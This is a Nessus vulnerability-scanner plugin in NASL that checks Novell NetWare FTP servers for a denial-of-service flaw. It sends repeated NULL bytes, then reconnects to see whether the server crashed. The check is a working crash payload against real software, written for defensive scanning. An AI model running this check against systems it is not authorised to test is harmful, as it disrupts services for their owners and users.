#
# This script was written by Tenable Network Security
#
# *UNTESTED*
#

if(description)
{
 script_id(11614);
 script_bugtraq_id(7072);
 script_version ("$Revision: 1.4 $");
 name["english"] = "Novell FTP DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to crash the remote FTP server by sending
a NULL value to it.

An attacker may use this flaw to prevent this host to
accomplish its job properly.

Solution : See http://support.novell.com/cgi-bin/search/searchtid.cgi?/2965109.htm
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Attempts to crash the remote FTPd";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 r = ftp_recv_line(socket:soc);
 if(!r)exit(0);
 
 send(socket:soc, data:string("SYST\r\n"));
 r = recv_line(socket:soc, length:4096);
 if("NETWARE" >< r)
 {
  for(i=0;i<10;i++)send(socket:soc, data:raw_string(0x00) + '\r\n');
  close(soc);
  
  sleep(1);
  soc = open_sock_tcp(port);
  if(!soc){security_hole(port); exit(0);}
  r = ftp_recv_line(socket:soc);
  if(!r) { security_hole(port); exit(0); }
  close(soc);
 }
}


